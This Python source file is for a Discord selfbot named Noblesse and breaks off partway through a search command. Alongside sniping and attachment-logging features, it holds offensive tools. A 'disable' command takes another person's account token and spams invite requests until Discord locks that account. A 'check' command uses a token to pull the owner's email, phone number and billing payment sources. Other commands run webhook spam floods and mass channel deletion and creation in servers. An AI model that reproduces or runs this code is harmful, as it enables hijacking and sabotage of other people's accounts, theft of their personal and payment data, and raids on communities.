import discord, json, datetime, colorama, time, sys, os, requests, socket, random, threading, ctypes, re, asyncio, emoji, noblesse, importlib_metadata
from colorama import Fore
colorama.init()
config = json.loads(open('assets/config.json','r').read())
if not os.path.exists("files"):
    os.mkdir("files")
    os.mkdir("files/DMChannels")
    os.mkdir("files/GroupChannels")
    os.mkdir("files/Servers")
if config['token'] == "" or config['token'] == "token here":
    print(f"Token isn't in the config.json...")
    time.sleep(5)
    sys.exit()
if config['prefix'] == "" or config['prefix'] == "prefix here":
    print(f"Prefix isn't in the config.json...")
    time.sleep(5)
    sys.exit()
if sys.platform.startswith("win"):
    ctypes.windll.kernel32.SetConsoleTitleW("Noblesse is loading... || @siph.er")
else:
    pass
start = datetime.datetime.now()
version = importlib_metadata.version('noblesse')
src = requests.get('https://pypi.org/pypi/noblesse/json',headers={'Host' : 'pypi.org','Content-Type' : 'application/json'})
current_version = src.json()['info']['version']
if str(version) != str(current_version):
    print("Im sorry, you do not have the current version of the noblesse therefore you are unable to run the bot. I advise you re run the install.bat, and install the new noblesse module, and install the new noblesse selfbot at github.com/siph-er/noblesse")
    sys.exit()
else:
    pass
class Genesis(discord.Client):
    async def on_connect(self):
        if sys.platform.startswith("win"):  
            ctypes.windll.kernel32.SetConsoleTitleW("Noblesse has loaded. || @siph.er")
        else:
            pass
        noblesse.clear()
        noblesse.ui(self,config['token'])
        noblesse.date_send(f"DM Logging: {Fore.WHITE}{config['StoreDMFiles']}{Fore.RESET}")
        noblesse.date_send(f"GC Logging: {Fore.WHITE}{config['StoreGCFiles']}{Fore.RESET}")
        noblesse.date_send(f"Server Logging: {Fore.WHITE}{config['StoreGuildFiles']}{Fore.RESET}")
        noblesse.date_send(f"Attachment Logging: {Fore.WHITE}{config['LogAttachments']}{Fore.RESET}")
        noblesse.date_send(f"Slotbot Sniper: {Fore.WHITE}{config['SlotbotSniper']['snipe']}{Fore.RESET}")
        noblesse.date_send(f"Pollux Sniper: {Fore.WHITE}{config['PolluxSniper']['snipe']}{Fore.RESET}")
        noblesse.date_send(f"Nitro Sniper: {Fore.WHITE}{config['NitroSniper']}{Fore.RESET}")
        print("----------------------------------------------------------------")
        await self.change_presence(activity=discord.Streaming(name=config['default_status'],url="https://twitch.tv/projectgenesisv1"))
    
    async def on_message(self, message):
        threading.Thread(target=noblesse.check_version).start()
        config = json.loads(open('assets/config.json','r').read())
################################################################################################### LOGGING CHECK ###################################################################################################
        if message.content.startswith("Someone just dropped") and message.author.id == config['SlotbotSniper']['id'] and config['SlotbotSniper']['snipe'] == "True":
            await message.channel.send("~grab",delete_after=10)
            noblesse.date_send(f"Attempted to snipe slotbot || Channel: [{message.channel.name}] || Server: [{message.guild.name}]")
        if 'Type `pick` for a chance to claim it!' in message.content and message.author.id == config['PolluxSniper']['id'] and config['PolluxSniper']['snipe'] == "True":
            await message.channel.send("pick")
            noblesse.date_send(f"Attempted to snipe pollux || Channel: [{message.channel.name}] || Server: [{message.guild.name}]")
        if config['LogAttachments'] == "True" and len(message.attachments) > 0 and message.author.bot == False:
            for attachment in message.attachments:
                threading.Thread(target=noblesse.log_attachments,args=[attachment,message,config]).start()
        if config['NitroSniper'] == "True"  and message.author.bot == False:
            threading.Thread(target=noblesse.check_nitro,args=[config,message]).start()
        if config['StoreDMFiles'] == "True" and len(message.attachments) > 0 and message.author.bot == False:
            if isinstance(message.channel, discord.DMChannel):
                for image in message.attachments:
                    threading.Thread(target=noblesse.DMChannel,args=[image,message]).start()
                    noblesse.date_send(f"File has been logged in DMChannel || User: [{message.author.name}]")
        if config['StoreGCFiles'] == "True" and len(message.attachments) > 0 and message.author.bot == False:
            if isinstance(message.channel, discord.GroupChannel):
                for image in message.attachments:
                    threading.Thread(target=noblesse.GroupChannel,args=[image,message]).start()
                    noblesse.date_send(f"File has been logged in GroupChannel || Group: [{message.channel}]")
        if config['StoreGuildFiles'] == "True" and len(message.attachments) > 0 and message.author.bot == False and message.guild != None:
            for image in message.attachments:
                    threading.Thread(target=noblesse.GuildChannel,args=[image,message]).start()
                    noblesse.date_send(f"File has been logged in Guild || Channel: [{message.channel.name}] || Server: [{message.guild.name}]")
################################################################################################### Commands ###################################################################################################

        if message.content == "prefix":
            text = f"```your prefix is {config['prefix']}```"
            embed = discord.Embed(description=text)
            embed.set_image(url=config['GenesisGif'])
            try:
                await message.edit(content="",embed=embed,delete_after=30) 
            except Exception as e:
                await message.channel.send(text)
        elif message.author.id == self.user.id and message.content.startswith(config['prefix']):
            commands = message.content.rsplit(config['prefix'])[1].split()
            noblesse.date_send(f"{Fore.WHITE}{self.user} used command: {Fore.RESET}{Fore.GREEN}{message.content}{Fore.RESET}")
############################################## CONFIG COMMANDS ##############################################
            if commands[0] == "nitrosniper":
                await message.delete()
                if config['NitroSniper'] == "True":
                    config['NitroSniper'] = "False"
                    text = "```I have disabled the nitro sniper.```"
                elif config['NitroSniper'] == "False":
                    config['NitroSniper'] = "True"
                    text = "```I have enabled the nitro sniper.```"
                else:
                    config['NitroSniper'] = "True"
                    text = "```I have enabled the nitro sniper.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
            elif commands[0] == "slotbotsniper":
                await message.delete()
                if config['SlotbotSniper']['snipe'] == "True":
                    config['SlotbotSniper']['snipe'] = "False"
                    text = "```I have disabled the Slotbot Sniper.```"
                elif config['SlotbotSniper']['snipe'] == "False":
                    config['SlotbotSniper']['snipe'] = "True"
                    text = "```I have enabled the Slotbot Sniper.```"
                else:
                    config['StoreGCFiles'] = "True"
                    text = "```I have enabled the Slotbot Sniper.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
            elif commands[0] == "polluxsniper":
                await message.delete()
                if config['PolluxSniper']['snipe'] == "True":
                    config['PolluxSniper']['snipe'] = "False"
                    text = "```I have disabled the Pollux Sniper.```"
                elif config['PolluxSniper']['snipe'] == "False":
                    config['PolluxSniper']['snipe'] = "True"
                    text = "```I have enabled the Pollux Sniper.```"
                else:
                    config['PolluxSniper'] = "True"
                    text = "```I have enabled the Pollux Sniper.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
            elif commands[0] == "storedmfiles":
                await message.delete()
                if config['StoreDMFiles'] == "True":
                    config['StoreDMFiles'] = "False"
                    text = "```I have disabled the DMFile Logger.```"
                elif config['StoreDMFiles'] == "False":
                    config['StoreDMFiles'] = "True"
                    text = "```I have enabled the DMFile Logger.```"
                else:
                    config['StoreDMFiles'] = "True"
                    text = "```I have enabled the DMFile Logger.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
            elif commands[0] == "storegcfiles":
                await message.delete()
                if config['StoreGCFiles'] == "True":
                    config['StoreGCFiles'] = "False"
                    text = "```I have disabled the GCFile Logger.```"
                elif config['StoreGCFiles'] == "False":
                    config['StoreGCFiles'] = "True"
                    text = "```I have enabled the GCFile Logger.```"
                else:
                    config['StoreGCFiles'] = "True"
                    text = "```I have enabled the GCFile Logger.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
            elif commands[0] == "storeguildfiles":
                await message.delete()
                if config['StoreGuildFiles'] == "True":
                    config['StoreGuildFiles'] = "False"
                    text = "```I have disabled the ServerFile Logger.```"
                elif config['StoreGuildFiles'] == "False":
                    config['StoreGuildFiles'] = "True"
                    text = "```I have enabled the ServerFile Logger.```"
                else:
                    config['StoreGuildFiles'] = "True"
                    text = "```I have enabled the ServerFile Logger.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
            elif commands[0] == "logattachments":
                await message.delete()
                if config['LogAttachments'] == "True":
                    config['LogAttachments'] = "False"
                    text = "```I have disabled the Attachment Logger.```"
                elif config['LogAttachments'] == "False":
                    config['LogAttachments'] = "True"
                    text = "```I have enabled the Attachment Logger.```"
                else:
                    config['LogAttachments'] = "True"
                    text = "```I have enabled the Attachment Logger.```"
                open('assets/config.json','w+').write(json.dumps(config,indent=4,sort_keys=True))
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.channel.send(embed=embed,delete_after=30)
                except:
                    await message.channel.send(f">>> {text}")
############################################## INFO COMMANDS ##############################################
            elif commands[0] == "info":
                embed = discord.Embed(
                    description=f"""```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n
Ping: {round(bot.latency * 1000, 1)}ms
Uptime: {str(datetime.datetime.now() - start).rsplit('.')[0]}
Image Logging Status: {config['StoreDMFiles']}
Nitro Sniping Status: {config['NitroSniper']}
OS Platform: {sys.platform}
Python Version: {sys.version}
Exception: {sys.exc_info()}
```"""
                )
                embed.set_image(url=config['GenesisGif'])
                await message.edit(content="",embed=embed,delete_after=30) 

############################################## FUN COMMANDS ##############################################
            elif commands[0] == "anal":
                await message.delete()
                em = discord.Embed(color=discord.Color.teal())   
                em.set_image(url=requests.get("https://nekos.life/api/v2/img/anal").json()['url'])
                await message.channel.send(embed=em)  
            elif commands[0] == "hentai":
                await message.delete()
                em = discord.Embed(color=discord.Color.teal())   
                em.set_image(url=requests.get("https://nekos.life/api/v2/img/Random_hentai_gif").json()['url'])
                await message.channel.send(embed=em) 
            elif commands[0] == "boobs":
                await message.delete()
                em = discord.Embed(color=discord.Color.teal())   
                em.set_image(url=requests.get("https://nekos.life/api/v2/img/boobs").json()['url'])
                await message.channel.send(embed=em) 
            elif commands[0] == "bj":
                await message.delete()
                em = discord.Embed(color=discord.Color.teal())   
                em.set_image(url=requests.get("https://nekos.life/api/v2/img/blowjob").json()['url'])
                await message.channel.send(embed=em) 
            elif commands[0] == "tits":
                await message.delete()
                em = discord.Embed(color=discord.Color.teal())   
                em.set_image(url=requests.get("https://nekos.life/api/v2/img/tits").json()['url'])
                await message.channel.send(embed=em)  
            elif commands[0] == "slap":
                if len(message.mentions) == 0:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - You have not mentioned anyone.")
                else:
                    await message.delete()
                    for member in message.mentions:
                        em = discord.Embed(color=discord.Color.teal())   
                        em.set_image(url=requests.get("https://nekos.life/api/v2/img/slap").json()['url'])
                        em.set_footer(text=f"{message.author.name} just slapped {member.name}")
                        await message.channel.send(embed=em)  
            elif  commands[0] == "kiss":
                if len(message.mentions) == 0:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - You have not mentioned anyone.")
                else:
                    await message.delete()
                    for member in message.mentions:
                        em = discord.Embed(color=discord.Color.teal())   
                        em.set_image(url=requests.get("https://nekos.life/api/v2/img/kiss").json()['url'])
                        em.set_footer(text=f"{message.author.name} just kissed {member.name}")
                        await message.channel.send(embed=em) 
            elif  commands[0] == "hug":
                if len(message.mentions) == 0:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - You have not mentioned anyone.")
                else:
                    await message.delete()
                    for member in message.mentions:
                        em = discord.Embed(color=discord.Color.teal())   
                        em.set_image(url=requests.get("https://nekos.life/api/v2/img/hug").json()['url'])
                        em.set_footer(text=f"{message.author.name} just hugged {member.name}")
                        await message.channel.send(embed=em) 
            elif  commands[0] == "cuddle":
                if len(message.mentions) == 0:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - You have not mentioned anyone.")
                else:
                    await message.delete()
                    for member in message.mentions:
                        em = discord.Embed(color=discord.Color.teal())   
                        em.set_image(url=requests.get("https://nekos.life/api/v2/img/cuddle").json()['url'])
                        em.set_footer(text=f"{message.author.name} just cuddled {member.name}")
                        await message.channel.send(embed=em)
############################################## STATUS COMMANDS ##############################################
            elif commands[0] == "playing":
                await message.delete()
                await self.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name=" ".join(commands[1:])))
            elif commands[0] == "watching":
                await message.delete()
                await self.change_presence(activity=discord.Activity(type=discord.ActivityType.watching,name=" ".join(commands[1:])))
            elif commands[0] == "listening":
                await message.delete()
                await self.change_presence(activity=discord.Activity(type=discord.ActivityType.listening,name=" ".join(commands[1:])))
            elif commands[0] == "streaming":
                await message.delete()
                await self.change_presence(activity=discord.Streaming(name=" ".join(commands[1:]),url="https://twitch.tv/dior"))
############################################## MISC COMMANDS ##############################################
            elif commands[0] == "d":
                if len(commands) == 1:
                    async for message in message.channel.history(limit=9999999999999999999999).filter(lambda m: m.author == message.author):
                        try:
                            await message.delete()
                        except Exception as e:
                            continue
                else:
                    counter=0
                    async for message in message.channel.history(limit=9999999999999999999999).filter(lambda m: m.author == message.author):
                        try:
                            await message.delete()
                        except Exception as e:
                            continue
                        counter+=1
                        if counter == int(commands[1])+1:
                            break
            elif commands[0] == "ascii":
                await message.delete()
                await message.channel.send(noblesse.asciigen(1999),delete_after=10.0)
            elif commands[0] == "spamascii":
                await message.delete()
                times = message.content.split()
                times = int(times[1])
                for x in range(times):
                    await message.channel.send(noblesse.asciigen(1999),delete_after=10)
            elif commands[0] == "del":
                await message.delete()
                if len(commands)-1 < 1:
                    text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Parameters: {config['prefix']}del <uid>```"
                    embed = discord.Embed(description=text)
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.channel.send(embed=embed,delete_after=30)
                    except:
                        await message.channel.send(f">>> {text}")
                else:
                    channel = await self.fetch_user(int(commands[1]))
                    text = f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Deleting Messages in: {channel}```"
                    embed = discord.Embed(description=text)
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.channel.send(embed=embed,delete_after=30)
                    except:
                        await message.channel.send(f">>> {text}")
                    async for message in channel.history(limit=999999999999999999999999999999999999999999).filter(lambda m: m.author == message.author):
                        try:
                            await message.delete()
                        except Exception as e:
                            continue
            elif commands[0] == "disable":
                invites = ["memes","csgo","mc","minecraft","dior","fortnite","vvs","skid","cap","tempo","catgirls"]
                if len(commands)-1 < 1:
                    embed = discord.Embed(description=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Please add a token to the message.```")
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Please add a token to the message.```")
                else:
                    await message.edit(content=f">>> **__Noblesse__**\n\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` -  Received token, checking ")
                    time.sleep(2)
                    headers = {'authorization' : commands[1]}
                    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
                    if src.status_code == 401:
                        embed = discord.Embed(description=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Invalid token.```")
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Invalid token.```")
                    elif src.status_code == 403:
                        embed = discord.Embed(description=f"``Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Phonelocked token.```")
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Phonelocked token.```")
                    else:
                        embed = discord.Embed(description=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Recieved user {src.json()['username']}, disabling now...```")
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Recieved user {src.json()['username']}, disabling now...")
                        while True:
                            invite = random.choice(invites)
                            src = requests.post(f'https://canary.discord.com/api/v6/invite/{invite}',headers=headers,timeout=10)
                            if src.status_code == 401:
                                embed = discord.Embed(description=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}- Token has been disabled.```")
                                embed.set_image(url=config['GenesisGif'])
                                try:
                                    await message.edit(content="",embed=embed,delete_after=30)
                                except:
                                    await message.edit(content=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}- Token has been disabled.```")
                                break
                            elif src.status_code == 403:
                                embed = discord.Embed(description=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}- Token has been phonelocked.```")
                                embed.set_image(url=config['GenesisGif'])
                                try:
                                    await message.edit(content="",embed=embed,delete_after=30)
                                except:
                                    await message.edit(content=f"```Token - {commands[1]}\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}- Token has been phonelocked.```")
                                break
                            else:
                                pass
            elif commands[0] == "spam":
                await message.delete()
                msg = message.content.split(commands[1])
                for x in range(int(commands[1])):
                    await message.channel.send(msg[1],delete_after=10)
            elif commands[0] == "check":
                if len(commands)-1 < 1:
                    embed = discord.Embed(description=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Parameters: {config['prefix']}check [token]```")
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Parameters: {config['prefix']}check [token]```")
                else:
                    embed = discord.Embed(description=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Received token, checking...```")
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Received token, checking...```")
                    headers = {'authorization' : commands[1]}
                    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers, timeout=10)
                    if src.status_code == 401:
                        embed = discord.Embed(description=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Invalid token.```")
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Invalid token.```")
                    elif src.status_code == 403:
                        embed = discord.Embed(description=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} -  Phonelocked token.```")
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Phonelocked token.```")
                    else:
                        friends = requests.get("https://canary.discordapp.com/api/v6/users/@me/relationships", headers=headers, timeout=10).json()
                        servers = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers, timeout=10).json()
                        dm_channels = requests.get('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, timeout=10).json()
                        billing = requests.get('https://discord.com/api/v8/users/@me/billing/payment-sources',headers=headers).json()
                        response = src.json()
                        text=f"""```
{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Token: {commands[1]}
Name: {response['username']}#{response['discriminator']}
ID: {response['id']}
Email: {response['email']}
Phone: {response['phone']}
Language: {response['locale']}
Servers: {len(servers)}
Friends: {len(friends)}
DM Channels: {len(dm_channels)}
--------------------Billing--------------------
{billing}
```"""
                        embed = discord.Embed(description=text)
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=text)
            elif commands[0] == "nitrocredit":
                data = requests.get("https://discordapp.com/api/v6/users/@me/applications/521842831262875670/entitlements",headers={'authorization' : config['token']}).json()
                newNitro = 0
                oldNitro = 0
                for i in data:
                    if "classic" in i["subscription_plan"]["name"].lower():
                        oldNitro += 1
                    else:
                        newNitro += 1
                text=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {newNitro} Monthly 10$ Nitro Credits.\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {oldNitro} Monthly 5$ Nitro Credits.```"
                embed = discord.Embed(description=text)
                embed.set_image(url=config['GenesisGif'])
                try:
                    await message.edit(content="",embed=embed,delete_after=30)
                except:
                    await message.edit(content=text)
            elif commands[0] == "delchan":
                if len(commands)-1 < 1:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Atleast put a guild...\n\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {config['prefix']}delchan <serverid>```")
                else:
                    guild = bot.get_guild(int(commands[1]))
                    prevchannelcount = len(guild.channels)
                    if guild != None:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Found Valid Server, deleting channels for '{guild.name}' now... ")
                        for channel in guild.channels:
                            try:
                                await channel.delete()
                            except Exception as e:
                                if "Missing Permissions" in str(e):
                                    await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Found Valid Guild '{guild.name}', however you probably tried to do this without permissions, anyway heres the error:\n\n{e}")
                                    break
                                else:
                                    pass
                        guild = bot.get_guild(int(commands[1]))
                        channelcountnow = len(guild.channels)
                        if channelcountnow == prevchannelcount:
                            pass
                        elif channelcountnow == 0:
                            await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - I have deleted all the channels for '{guild.name}'.")
                        elif channelcountnow < prevchannelcount:
                            await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - I haven't deleted all the channels, but i deleted some xd")
                    else:
                        await message.edit(content=f"``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Invalid Guild '{commands[1]}'")
            elif commands[0] == "cchan":
                if len(commands)-1 > 1 and len(commands)-1 < 2:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {config['prefix']}cchan <serverid> [name]")
                elif len(commands)-1 > 1 and len(commands)-1 > 2:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {config['prefix']}cchan <serverid> [name]")
                elif len(commands)-1 > 1 and len(commands)-1 >= 2:
                    guild = bot.get_guild(int(commands[1]))
                    if guild != None:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Found Valid Guild '{guild.name}', creating channels named '{commands[2]}' now... ")
                        for x in range(30):
                            try:
                                await guild.create_text_channel(name=commands[2])
                            except Exception as e:
                                await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Found Valid Guild '{guild.name}', however you probably tried to do this without permissions, anyway heres the error:\n\n{e}")
                                break
                    else:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Invalid Guild '{commands[1]}'")
                else:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {config['prefix']}cchan <serverid> [name]")
            elif commands[0] == "delete-link":
                if len(commands)-1 <1:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Mention a webhook link.")
                else:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - deleting webhook link...")
                    time.sleep(2)
                    try:
                        requests.delete(commands[1])
                        await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - deleted webhook link")
                    except:
                        await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - unable to delete webhook link")
            elif commands[0] == "wspam":
                webhooks = []
                if len(commands)-1 < 1:
                    text=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Mention a Guild ID```"
                    embed = discord.Embed(description=text)
                    embed.set_image(url=config['GenesisGif'])
                    try:
                        await message.edit(content="",embed=embed,delete_after=30)
                    except:
                        await message.edit(content=text)
                else:
                    args = message.content.rsplit(f"{config['prefix']}wspam {commands[1]}")
                    guild = bot.get_guild(int(commands[1]))
                    if guild != None:
                        text=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Guild '{guild.name}' acquired. Creating webhooks now...```"
                        embed = discord.Embed(description=text)
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=text)
                        myperms = random.choice(guild.channels).permissions_for(guild.get_member(self.user.id))
                        if myperms.manage_webhooks and myperms.manage_channels:
                            for channel in guild.channels:
                                if isinstance(channel, discord.CategoryChannel) or isinstance(channel, discord.VoiceChannel):
                                    pass
                                else:
                                    webhooksss = await channel.webhooks()
                                    if len(webhooksss) > 0:
                                        for web in webhooksss:
                                            webhooks.append(f"https://ptb.discordapp.com/api/webhooks/{web.id}/{web.token}")
                                    else:
                                        webhook = await channel.create_webhook(name=noblesse.asciigen(16))
                                        webhooks.append(f"https://ptb.discordapp.com/api/webhooks/{webhook.id}/{webhook.token}")
                            text=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Starting to Webhook Spam now with {len(webhooks)} webhooks...```"
                            embed = discord.Embed(description=text)
                            embed.set_image(url=config['GenesisGif'])
                            try:
                                await message.edit(content="",embed=embed,delete_after=30)
                            except:
                                await message.edit(content=text)
                            for x in range(100):
                                for webhook in webhooks:
                                    threading.Thread(target=noblesse.webhook_spam,args=[webhook,args[1]]).start()
                        else:
                            text=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - You do not contain the MANAGE_WEBHOOKS or MANAGE_CHANNELS permission.```"
                            embed = discord.Embed(description=text)
                            embed.set_image(url=config['GenesisGif'])
                            try:
                                await message.edit(content="",embed=embed,delete_after=30)
                            except:
                                await message.edit(content=text)
                    else:
                        text=f"```{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Guild ID is invalid.```"
                        embed = discord.Embed(description=text)
                        embed.set_image(url=config['GenesisGif'])
                        try:
                            await message.edit(content="",embed=embed,delete_after=30)
                        except:
                            await message.edit(content=text)
            elif commands[0] == "av":
                args = message.content.split()
                if len(message.mentions) == 0:
                    if len(args) == 1:
                        await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Avatar link being retrieved for {self.user}... ")
                        time.sleep(1)
                        await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {str(self.user.avatar_url)}")
                    elif len(args) > 1:
                        user = bot.get_user(int(args[1]))
                        if user != None:
                            await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Avatar link being retrieved for {user}... ")
                            time.sleep(1)
                            await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {str(user.avatar_url)}")
                            
                        else:
                            await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - ID {args[1]} is Invalid.")
                else:
                    user = message.mentions[0]
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Avatar link being retrieved for {user.name}... ")
                    time.sleep(1)
                    await message.edit(content=f"{message.content}\n``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - {str(user.avatar_url)}")
                        
            elif commands[0] == "encrypt":
                await message.delete()
                if len(commands) - 1 < 1:
                    await message.edit(content=f">>> ``{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`` - Specify a number.")
                else:
                    counter = 0
                    async for message in message.channel.history(limit=999999999999999).filter(lambda m: m.author == message.author):
                        text=''
                        new_msg = noblesse.encrypt(message,text)
                        await message.edit(content=new_msg)
                        counter += 1
                        if counter == int(commands[1]):
                            break
############################################## SEARCH COMMANDS ##############################################
            elif commands[0] == "search":
                if len(commands)-1 < 1:
                    text = f"````{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {config['prefix']}search (-github,-urban,-insta) <name>/[word]/(username)```"
                    embed = discord.Embed(description=text)
                    embed.set_image(url=config['GenesisGif'])
                    try:
